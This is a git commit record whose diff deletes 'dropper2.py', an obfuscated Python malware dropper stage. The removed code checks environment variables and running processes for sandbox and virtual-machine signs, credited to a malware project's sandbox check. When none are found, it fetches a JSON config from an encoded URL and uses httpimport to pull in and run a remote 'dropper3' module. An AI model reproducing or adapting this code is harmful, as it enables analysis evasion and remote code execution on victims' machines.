960d4524fb3ac42cef8627f461e9bbfbfe1f2c3d
pyscripter99 <78647110+pyscripter99@users.noreply.github.com>
2022-06-28 09:40:38 +1000

    Delete dropper2.py

--- dropper2.py
+++
@@ -1,37 +0,0 @@
-####################################################
-####################################################
-# Obfuscated with PyObfx #
-import os as mTwI
-
-DTHCwIrzYv = lambda n: (n + 1) / (2 + 5)
-kZopYctmde = lambda s: ''.join(chr(int(DTHCwIrzYv(ord(c)))) for c in s)
-#### DISCLAMERL: FULL CREDITS TO                ####
-#### MALWAREDLLC/BYOB FOR THIS SANDBOX CHECK!!! ####
-####################################################
-####################################################
-
-def SvFEInfzNbhiRqmdYLjxJD():
-    SvFEInfzNbhiRqmdYLjxJD = [KsJClA for KsJClA in mTwI.environ if kZopYctmde("ýÁèă") in KsJClA and not KsJClA in [kZopYctmde("ýÁèăĘâôÖĘÖåô÷¾ßßĘë¾÷Ó")]] #whitlist virtualbox installed in user (only positive if in sandbox enviroment) 
-    dcmnkUzwuYqyZhNClp = [IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))] for IodzXShH in mTwI.popen(kZopYctmde("ŗĞŔļĿĶŔŗ") if mTwI.name == kZopYctmde("Ņŗ") else kZopYctmde("ŋŔ")).read().splitlines()[int(DTHCwIrzYv(4)):] if IodzXShH.split()[int(DTHCwIrzYv(-5)) if mTwI.name == kZopYctmde("Ņŗ") else -int(DTHCwIrzYv(-2))].lower().split(kZopYctmde(""))[int(DTHCwIrzYv(-5))] in [kZopYctmde("ţĪŅŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŔĪőŝĶĤĪ"), kZopYctmde("ŝġňţŗőĞŦ"), kZopYctmde("ŝłŚŔőŝĤ"), kZopYctmde("ŝłŔőŝĤ"), kZopYctmde("ŝłŠĞőĪŚŔĪő"),kZopYctmde("ŝłŠĞőĪŗőĞŦ"), kZopYctmde("ŝłŗňňĿŔħ"), kZopYctmde("ŝłĤňłŋŚŗĪ"), kZopYctmde("ŝłłĪł")]]
-    import os as mTwI
-
-    # Running the aforementioned command and saving its output
-    KhHdtUIOQDkL = mTwI.popen(kZopYctmde("ŠłĶĤ[ŋőňĤĪŔŔ[İĪŗ[ħĪŔĤőĶŋŗĶňŅ[ŋőňĤĪŔŔĶħ")).read()
-
-    # Displaying the output
-    pAEufw = KhHdtUIOQDkL.split(kZopYctmde(""))
-    while "" in pAEufw:
-        pAEufw.remove("")
-    if len(pAEufw) < int(DTHCwIrzYv(85)): return bool(int(DTHCwIrzYv(-2)))
-
-    return bool(SvFEInfzNbhiRqmdYLjxJD + dcmnkUzwuYqyZhNClp)
-
-def run():
-    if not SvFEInfzNbhiRqmdYLjxJD():
-        import httpimport, requests, json
-        qQjorxLbdKAWJOIHaiUl = kZopYctmde("ĳŗŗŋŔ©őĞŠİĶŗĳŚġŚŔĪőĤňŅŗĪŅŗĤňłŋŦŔĤőĶŋŗĪő¦¦âňħŚĿĪŔĭňőĀÖåñ¾÷łĞĶŅłňħŚĿĪŔĹŔňŅ")
-        ueGrskjYLAzoBSwEQWdVCO = requests.get(qQjorxLbdKAWJOIHaiUl).text
-        rJfleaiZEuKD = json.loads(ueGrskjYLAzoBSwEQWdVCO)
-        with httpimport.github_repo(rJfleaiZEuKD[kZopYctmde("łňħŚĿĪĘĤňŅĭĶİ")][kZopYctmde("İĶŗĳŚġĘŚŔĪőŅĞłĪ")], rJfleaiZEuKD[kZopYctmde("łňħŚĿĪĘĤňŅĭĶİ")][kZopYctmde("İĶŗĳŚġĘőĪŋň")]):
-            import dropper3
-            dropper3.run()
